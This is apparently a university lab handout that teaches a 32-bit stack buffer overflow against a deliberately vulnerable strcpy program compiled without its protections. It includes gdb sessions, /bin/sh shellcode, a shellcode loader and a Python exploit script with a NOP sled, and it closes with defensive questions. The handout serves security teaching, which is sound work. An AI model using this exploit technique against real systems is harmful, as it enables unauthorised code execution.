

# Buffer Overflow: Code Execution By Shellcode Injection 

Adapted from [https://hg8.sh/posts/binary-exploitation/buffer-overflow-code-execution-by-shellcode-injection/]



This details how to exploit a buffer overflow in
order to achieve remote code execution via shellcode injection.

# [](#Setting-up-our-environment "Setting up our environment") Setting up our environment 

sudo apt update

sudo apt install libc6-dev-i386

git clone https://github.com/khaefner/buffer_overflow.git

cd buffer_overflow

# Background

As previously stated in the introduction, today's memory layout of a
running application has become significantly more complex due to the
implementation of various security measures. These measures have made
exploiting vulnerabilities such as buffer overflow quite challenging.
Some of the common and highly effective security measures include for
example:

-   **ASLR** protection
    (***A**ddress **S**pace **L**ayout **R**andomization*) randomly
    arranges the address space positions of key data areas of a program.
    At each new execution, the stored data is placed in different memory
    spaces.
-   **SSP** protection (***S**tack-**S**mashing **P**rotector*) detects
    stack buffer overrun by aborting if a secret value on the stack is
    changed. These secret values ("Canaries") are inserted between data
    segments in the stack. The integrity of the secrets are checked and
    the program immediately interrupt if modification is detected.
-   No possible Stack or Heap execution, these memory spaces are
    intended to only contain variables and pointers but never executable
    code.

For the learning purpose of our example, we are going to disable these
protections and force a 32 bits compilation.

```bash
 gcc -m32 -g -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack vuln.c -o vuln
 ```

Flags explanation:

`-m32`: Compile in 32 bits

`-g`: Generates debug information to be used by GDB debugger.

`-mpreferred-stack-boundary=2`: Ensure that the stack is set up into
4-bytes increments, preventing optimisation of the stack segmentation
that could make our example confusing.

`-fno-stack-protector`: Disable Stack Smashing protection.

`-z execstack`: Disable NX (allowing stack segment to be executable).

# [](#Overflowing-the-stack "Overflowing the stack")Overflowing the stack 

Let's now open our program with `gdb`:

```bash
gdb ./vuln
Reading symbols from ./vuln...
(gdb) list
1       #include <string.h>
2
3       int main (int argc, char** argv) {
4         char buffer [500];
5         strcpy(buffer, argv[1]);
6         return 0;
7       }
(gdb)

```

This is what what our program stack will look like:

![memory segmentation
representation,pdfwidth=50%,scaledwidth=50%](https://user-images.githubusercontent.com/9076747/212431420-c3663e95-2fd7-4e41-b677-0fed2cac4a1b.svg)

`Buffer:` A contiguous, fixed-size block of memory used to temporarily store data. In programming, this is often an array on the stack that can be overflowed if user input isn't properly checked.

`EBX:` A 32-bit general-purpose register in the x86 architecture. While it can be used for any task, its name stands for "Base Index" and it was often used to store the base address of a data segment.

`EBP:` The 32-bit Base Pointer (or Frame Pointer) register. It points to the base of the current function's stack frame, providing a stable reference point for accessing local variables and function arguments.

`EIP:` The 32-bit Instruction Pointer register. This is a critical register that holds the memory address of the very next instruction the CPU will execute. Controlling EIP is the primary goal of many buffer overflow exploits.

In order to exploit the buffer overflow in our program, we are going to
pass an input bigger than 500 characters to our `buffer[]` variable.

It's important to note that, even though the stack itself grows upward
from high-memory to lower-memory addresses, the buffer itself is filled
from lower to higher memory addresses.

In our example, when we input a string longer than 500 characters, it
will begin overwriting the register that's lower on the stack (and
higher up in the memory).

For example if we use a 501 characters long input, the following will
happen:

![memory representation buffer
overflow, pdfwidth=50%,scaledwidth=50%](https://user-images.githubusercontent.com/9076747/212432871-2764417e-d29b-400f-9abe-0265c1d4abab.svg)

Well let's now see in practice what happens when we input a 501 long
string to our program.

We can use python to generate a string made of 501 occurrences of the
letter 'A' (`0x41` is hexadecimal for 65, which is the ASCII-code for
the letter 'A').

From `gdb` this can be done using the `run` command:

```bash
gdb ./vuln
Reading symbols from vuln...
(gdb) run $(python3 -c "print('\x41'*501)")
[Inferior 1 (process 3508) exited normally]
```


Nothing happens, it's normal since EBX is not a critical register in our
example program.

Increase the numbe of 'A's you are putting into the buffer.  


---
`Action:`  Answer this question with the number required to cause an illegal instruction.
---

How many accurances of 'A' characters do you have to increase to cause a 
segmentation fault (Note: you may see a SIGILL, Illegal instruction..this is where the
execution pointer is being overwritten add one more to make sure, you should see 
Segmentation fault) ?   

_Record this number_


Let's now add a breakpoint in order to highlight how the EBX register
got overwritten with an extra `x41` ('A'):

```bash
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000118d <+0>:	push   %ebp
   0x0000118e <+1>:	mov    %esp,%ebp
   0x00001190 <+3>:	push   %ebx
   0x00001191 <+4>:	sub    $0x1f4,%esp
   0x00001197 <+10>:	call   0x11c5 <__x86.get_pc_thunk.ax>
   0x0000119c <+15>:	add    $0x2e58,%eax
   0x000011a1 <+20>:	mov    0xc(%ebp),%edx
   0x000011a4 <+23>:	add    $0x4,%edx
   0x000011a7 <+26>:	mov    (%edx),%edx
   0x000011a9 <+28>:	push   %edx
   0x000011aa <+29>:	lea    -0x1f8(%ebp),%edx
   0x000011b0 <+35>:	push   %edx
   0x000011b1 <+36>:	mov    %eax,%ebx
   0x000011b3 <+38>:	call   0x1040 <strcpy@plt>
   0x000011b8 <+43>:	add    $0x8,%esp
   0x000011bb <+46>:	mov    $0x0,%eax
   0x000011c0 <+51>:	mov    -0x4(%ebp),%ebx
   0x000011c3 <+54>:	leave
   0x000011c4 <+55>:	ret
End of assembler dump.

```

Now set a break point where the program leaves the main functon in the above example it is at location 0x000011c3


```bash
(gdb) break *0x000011c3
Breakpoint 1 at 0x11c3: file vuln.c, line 8.
```
Update:  If you are getting cannot access memory at address xxxxxxxx

try this:
```bash
(gdb) break *main+51
```
Then you will likely have to step through the code using.

```bash
(gdb) si
Breakpoint 2, main (argc=2, argv=0xffffd124) at vuln.c:8
8	}
```

Now:
Re-run your program with the following:

```bash
(gdb) run $(python3 -c "print('\x41'*501)")                                                                             
Starting program: ./vuln $(python3 -c "print('\x41'*501)")

Breakpoint 1, 0x080491ac in main (argc=2, argv=0xffffd0b4) at vuln.c:7
7       }
```

The above writes 501 `A chars` to memory


Now by checking the registers with the `info registers` 
Is the register being overwritten?  You should see '41'.
Increase the number of `A` chars you are writting (remember \x41) 

verify that the `ebx` address is being overwritten :

```bash
(gdb) info registers
[...]
ebx            0xf7fa0041          -134610879
[..]
```

Question: How many chars are needed to overwrite the whole `ebx`
register?  (hint should look like this: `ebx            0x41414141`)

---
`Action:`  Take a screen shot of your main memory layout using the 'info registers' 
---



We can also visualize what the stack looks like in memory from gdb with
`x/12x $sp-20`. Let's decompose the command to understand how it works:

-   `x/14x` displays 14 bytes of memory in a hexadecimal format.
-   `$sp+460` starts the memory reading from the stack pointer (\$sp)
    position offset by +460, which is around where our `ebx` register is
    located.

Beforehand let's slightly tweak our payload to make it more visible on
the stack representation, instead of 'A' we will replace the 4
overflowed bytes with 'B' (`x42`):

```bash
(gdb) run $(python3 -c "print('\x41'*500+'\x42'*4)") 
Starting program: ./vuln $(python3 -c "print('\x41'*500+'\x42'*4)") 

Breakpoint 1, 0x080491ac in main (argc=2, argv=0xffffd0b4) at vuln.c:7
7       } 
(gdb) x/14x $sp+460
0xffffcfbc:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfcc:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfdc:     0x41414141      0x41414141      0x42424242      0x00000000
0xffffcfec:     0xf7dad119      0x00000002
```

Now let's overwrite every register following our buffer, `ebx` with
'BBBB', `ebp` with 'CCCC' and `eip` with 'DDDD':

```bash
(gdb) run $(python3 -c "print('\x41'*500+'\x42'*4+'\x43'*4+'\x44'*4)") 

Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
```
```bash
(gdb) info registers
[...]
ebx            0x42424242          1111638594
esp            0xffffcff0          0xffffcff0
ebp            0x43434343          0x43434343
esi            0x804b0e0           134525152
edi            0xf7ffcb80          -134231168
eip            0x44444444          0x44444444
[...]
```

```bash
(gdb) (gdb) x/14x $sp+460
0xffffcfbc:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfcc:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfdc:     0x41414141      0x41414141      0x42424242      0x43434343
0xffffcfec:     0x44444444      0x00000000
```

You will likely need to step through your code until you exit main 
(and then see the overwritten eip register this is the point of the crash)

```bash
(gdb) run $(python3 -c "print('\x41'*500+'\x42'*4+'\x43'*4+'\x44'*4)") 
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/khaefner/Development/buffer_overflow/vuln $(python3 -c "print('\x41'*500+'\x42'*4+'\x43'*4+'\x44'*4)")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x565561c3 in main (argc=0, argv=0xffffd134) at vuln.c:8
8	}
(gdb) info registers
eax            0x0                 0
ecx            0xffffd4e0          -11040
edx            0xffffd07b          -12165
ebx            0x42424242          1111638594
esp            0xffffce80          0xffffce80
ebp            0xffffd078          0xffffd078
esi            0x56558eec          1448447724
edi            0xf7ffcb80          -134231168
eip            0x565561c3          0x565561c3 <main+54>
eflags         0x292               [ AF SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) x/14x $sp+460
0xffffd04c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd05c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd06c:	0x41414141	0x41414141	0x42424242	0x43434343
0xffffd07c:	0x44444444	0x00000000
(gdb) si
0x565561c4	8	}
(gdb) info registers
eax            0x0                 0
ecx            0xffffd4e0          -11040
edx            0xffffd07b          -12165
ebx            0x42424242          1111638594
esp            0xffffd07c          0xffffd07c
ebp            0x43434343          0x43434343
esi            0x56558eec          1448447724
edi            0xf7ffcb80          -134231168
eip            0x565561c4          0x565561c4 <main+55>
eflags         0x292               [ AF SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) si
0x44444444 in ?? ()
(gdb) info registers
eax            0x0                 0
ecx            0xffffd4e0          -11040
edx            0xffffd07b          -12165
ebx            0x42424242          1111638594
esp            0xffffd080          0xffffd080
ebp            0x43434343          0x43434343
esi            0x56558eec          1448447724
edi            0xf7ffcb80          -134231168
eip            0x44444444          0x44444444
eflags         0x292               [ AF SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
```



---
`Action:`  Take a screen shot of your memory layout using the above commands.
---

Our stack now looks like this:

![memory buffer overflow payload
injection](https://user-images.githubusercontent.com/9076747/215349720-cd619f4d-58d5-4be6-a38e-aaecc765b6d3.svg)

We achieved full control of adjacent memory registers. So what can we do
with such access ? Let's move on to exploitation.

# [](#Exploitation "Exploitation")Exploitation 

The last register we manage to overwrite is `eip`.

The EIP register holds the "Extended Instruction Pointer" for the stack.
In other words, it tells the computer where to go next to execute the
next command and controls the flow of a program.

This means that if we can input malicious code into the program, we can
use the buffer overflow to overwrite the `eip` register to point to the
memory address of the malicious code.

And that's exactly what we are going to do now, and we will start by
crafting a shellcode.

## [](#Shellcode-Creation "Shellcode Creation")Shellcode Creation 

First of all, what is a shellcode ?

A shellcode is a small piece of code used as payload when exploiting an
overflow vulnerability. Historically it's called "shellcode" because it
typically starts a command shell from which the attacker can control the
compromised machine.

In our case, we will inject a shellcode into our buffer in order to have
it get executed later on.\
[Wikipedia](https://en.wikipedia.org/wiki/Shellcode) defines the writing of shellcode "as much of an art as
it is a science", since shellcode depends on the operating system, CPU
architecture and is commonly written in Assembly.

You can easily find plenty on the internet. For our example we are going
to use a very common and simple
[shellcode](http://shell-storm.org/shellcode/files/shellcode-827.html) for x86 which executes a `/bin/sh` shell.

Here is a quick overview of this shellcode:

```bash
xor eax, eax      ; put 0 into eax
push eax          ; push 4 bytes of null from eax to the stack
push 0x68732f2f   ; push "//sh" to the stack
push 0x6e69622f   ; push "/bin" to the stack
mov ebx, esp      ; put the address of "/bin//sh" to ebx, via esp
push eax          ; push 4 bytes of null from eax to the stack
push ebx          ; push ebx to the stack
mov ecx, esp      ; put the address of ebx to ecx, via esp
mov al, 0xb       ; put 11 into eax, since execve() is syscall #11
int 0x80          ; call the kernel to make the syscall happen
```

This code can be assembled and linked using `nasm` to create an
executable binary program as an Executable and Linking Format (ELF)
binary:

```bash
nasm -f elf shellcode.asm
```

Now we need to disassemble it in order to get the shellcodes bytes:

```bash
objdump -d -M intel shellcode.o

shellcode.o:     file format elf32-i386

Disassembly of section .text:

00000000 <.text>:
   0:   31 c0                   xor    eax,eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx,esp
   f:   50                      push   eax
  10:   53                      push   ebx
  11:   89 e1                   mov    ecx,esp
  13:   b0 0b                   mov    al,0xb
  15:   cd 80                   int    0x80
```

We can now easily extract the hexadecimal shellcode, either by hand or
with some bash-fu:

```bash
objdump -d ./shellcode.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

Ooutput:
```
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```

## [](#Shellcode-Testing "Shellcode Testing")Shellcode Testing

Now to be sure our shellcode works, let's write a simple program to run
it on our machine:

```bash
#include <stdio.h>
#include <string.h>

int main(){
    char shellcode[] = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
    int (*ret)() = (int(*)())shellcode;
    return ret();
}
```

Let's run it:

```bash
gcc -m32 -z execstack shellcode-loader.c -o shellcode-loader
[hg8@archbook ~]$ ./shellcode-loader
$ 
```

If you see a new shell (it will look different than your parrot shell) then all is good, let's now inject the shellcode into our vulnerable program.

## [](#Shellcode-Injection "Shellcode Injection")Shellcode Injection 

We now need to make our vulnerable program execute our shellcode. To do
so we will inject the shellcode in the input data payload, for it to be
stored in our buffer.

The next step will be to have our return address point to the memory
location where our shellcode is stored in order for it to be executed.

Since memory may change a bit during program execution and we don't know
the exact location of our shellcode we will use the NOP-sled technique.

### [](#NOP-sled "NOP-sled")NOP-sled 

![NOP
Sled](https://image.slidesharecdn.com/bsidesvienna-2014-miroslavstampar-smashingthebuffer-141123103432-conversion-gate02/95/smashing-the-buffer-19-638.jpg?cb=1416739072)

A NOP sled, also known as a NOP slide, is a technique used to help
ensure that a shellcode is executed even if the exact memory location of
the exploit payload is not known.

The NOP, or No-Operation, instruction is a machine language instruction
that performs no operation and takes up one machine cycle. NOP sled
takes advantage of this instruction by creating a sequence of NOP
instructions that can serve as a landing pad for the program execution
flow.

We will craft a sequence of NOP instructions followed by our shellcode.
The idea is that if the execution flow is redirected to any point within
the NOP sled, the CPU will execute the NOP instructions and keep moving
forward until it hits the shellcode.

When utilizing a NOP-sled, the precise location of the shellcode within
the buffer doesn't matter for the return address to reach it. What we do
know is that it will reside somewhere within the buffer, and its length
will be 25 bytes.

With our shellcode of 25 bytes and a payload of 512 bytes, we have 487
bytes to fill with NOP, which we will divide like so:

Payload: `[ NOP SLED] [ SHELLCODE ] [ RETURN ADDRESS ]`

### [](#Crafting-our-exploit "Crafting our exploit")Crafting our exploit

We will use a Python script to craft our exploit, since we use Python 3
it's important to use `bytes` type.

In addition, since we are working on x86, the hexadecimal value for NOP
instructions is `0x90`.

Save the following as exploit-test.py

```bash
import sys

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
eip = b"\x43\x43\x43\x43" * 10
nop = b"\x90" * 447
buff = nop + shellcode + eip

sys.stdout.buffer.write(buff) 
```

Since we don't know for now what the return address (`eip`) will be, we
currently replace it with `C` (`x43`) that we repeat 10 times to have a
bit of padding between our shellcode and the stack.

Our NOP sled is being repeated 447 times since we need to write 512
bytes to overwrite the return address:

```bash
512        - (4 * 10) -     25    =     447
Total size -    eip   - shellcode =   nop sled.
```

Here is what we expect our memory to looks like after execution of our
payload:

![Stack Overflowed shellcode
injection](https://github.com/hg8/hg8.github.io/assets/9076747/7968b3ab-4e06-482b-a03d-ac19f7e117cb)

Let's run our payload:

```bash
gdb ./vuln
Reading symbols from vuln2-nosec...
(gdb) run $(python3 exploit-test.py)
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
```

We get exactly what we were looking for, a segmentation fault since we
didn't provide a valid return address yet. Let's now inspect our memory
to define what the return address should be.

When inspecting the memory, we can see our payload was injected as
expected:

```bash

┌─[khaefner@cs456-010]─[~/Development/buffer_overflow]
└──╼ $gdb ./vuln 
Reading symbols from ./vuln...
(gdb) list main
1	#include <stdio.h>
2	#include <string.h>
3	
4	int main (int argc, char** argv) {
5	  char buffer [500];
6	  strcpy(buffer, argv[1]);
7	  return 0;
8	}
(gdb) break 7
Breakpoint 1 at 0x11bb: file vuln.c, line 7.
(gdb) run $(python3 exploit-test.py)
Starting program: /home/khaefner/Development/buffer_overflow/vuln $(python3 exploit-test.py)
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, main (argc=0, argv=0xffffd134) at vuln.c:7
7	  return 0;
(gdb) print &buffer
$1 = (char (*)[500]) 0xffffce80
(gdb) x/40xb 0xffffce80
0xffffce80:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffce88:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffce90:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffce98:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffcea0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
---
```

---
`Action:`  Take a screen shot of your Terminal output from the above commands
---


Let's now pick any memory address within the `x90` NOP sled area before
the shellcode to be our return address. From the screenshot above we can
pick `0xffffce90` for example.


Since Intel CPUs are [little
endian](https://en.wikipedia.org/wiki/Endianness), we need to reverse the address for our payload.

Note on Little-Endian: Intel CPUs store multi-byte values with the least-significant byte first. This means you must write your address backward in the exploit.
If GDB shows the address is 0xffffce90, you must write it as b"\x90\xce\xff\xff".

Our script becomes:

```bash
import sys

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
eip = b"\x90\xce\xff\xff" * 10
nop = b"\x90" * 447
buff = nop + shellcode + eip

sys.stdout.buffer.write(buff) 
```

Note:  Pay close attention to the order of the bytes!!

If everything goes fine, our program `strcpy` will copy our string, and
when it will try to return it will load our injected return value,
redirecting to the NOP Sled, followed by the shellcode that will then be
executed.

Let's give it a try:

```bash
 gdb ./vuln
(gdb) run $(python3 exploit.py)

Using host libthread_db library "/usr/lib/libthread_db.so.1".
process 6722 is executing new program: /usr/bin/bash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
sh-5.1$
```

And here we go! The buffer overflow was successfully exploited,
resulting in obtaining access to a command shell.


---
`Action:`  Take a screen shot of exploit working
---



# What to hand in

## Submission Instructions

Please submit a single PDF document containing the following items in order. For each screenshot, please include a brief caption explaining what the image shows and why it is significant to the lab.

    Title Page: Your name, course number (CS456), and lab title.

   - Initial EIP Overwrite:

      --  The number of 'A' characters required to overwrite EIP and cause a segmentation fault.

      --  A screenshot of the info registers command in GDB showing EIP overwritten with 0x41414141.

   - Full Register Overwrite: A screenshot showing the output of info registers and x/14x $sp+460 after running the payload with 'B's, 'C's, and 'D's. The EIP, EBP, and EBX registers should be clearly overwritten.

   - Test exploit code: A screen shot of the terminal showing the exploit-test.py being run with the print of the memory running in the buffer

   - Final Exploit Code: The complete, final source code for your exploit.py script.

   - Successful Exploitation: A screenshot of your terminal after running the final exploit. It must show the exploit being launched from your command line and the resulting `$` shell prompt, proving you gained code execution.

   - Answers to Questions: Your complete answers to the three questions below.

 1. The Role of Security Protections: This lab required us to disable several modern security protections using gcc flags like -fno-stack-protector and -z execstack. Choose one of these two protections and explain in your own words (1) what it does and (2) how it would have prevented the specific exploit you just performed.

2. The NOP Sled: Explain the purpose of the NOP sled. What problem does it solve for the attacker? What is a potential disadvantage of using a very large NOP sled in an exploit?

3. Secure Coding: The vulnerability in vuln.c was caused by the use of the strcpy() function. Identify a safer C library function that could be used to copy argv[1] into the buffer and explain why it is safer than strcpy(). Rewrite the strcpy line in vuln.c to use this safer function correctly.


## [](#References "References")References 

-   [Stack Smashing
    Protector](https://wiki.osdev.org/Stack_Smashing_Protector){target="_blank"
    rel="noopener"}
-   [Address space layout
    randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization){target="_blank"
    rel="noopener"}
-   [Understanding stack alignment
    enforcement](https://stackoverflow.com/questions/47411158/understanding-stack-alignment-enforcement){target="_blank"
    rel="noopener"}
-   [Buffer Overflow -
    Exploitation](https://en.wikipedia.org/wiki/Buffer_overflow#Exploitation){target="_blank"
    rel="noopener"}
-   [Buffer Overflow - Protective
    Countermeasures](https://en.wikipedia.org/wiki/Buffer_overflow#Protective_countermeasures){target="_blank"
    rel="noopener"}
-   [Data structure
    alignment](https://en.wikipedia.org/wiki/Data_structure_alignment){target="_blank"
    rel="noopener"}
-   [How to look at the stack with
    gdb](https://jvns.ca/blog/2021/05/17/how-to-look-at-the-stack-in-gdb/){target="_blank"
    rel="noopener"}
-   [Writing Shellcode for Linux and
    \*BSD](http://www.kernel-panic.it/security/shellcode/shellcode5.html){target="_blank"
    rel="noopener"}
-   [Linux Shellcode 101: From Hell to
    Shell](https://axcheron.github.io/linux-shellcode-101-from-hell-to-shell/){target="_blank"
    rel="noopener"}
-   [Linux/x64 - execve(/bin/sh) Shellcode (23
    bytes)](https://www.exploit-db.com/exploits/46907){target="_blank"
    rel="noopener"}
-   [Two basic ways to run and test
    shellcode](http://disbauxes.upc.es/code/two-basic-ways-to-run-and-test-shellcode/){target="_blank"
    rel="noopener"}
-   [Running a Buffer Overflow Attack -
    Computerphile](https://www.youtube.com/watch?v=1S0aBV-Waeo){target="_blank"
    rel="noopener"}

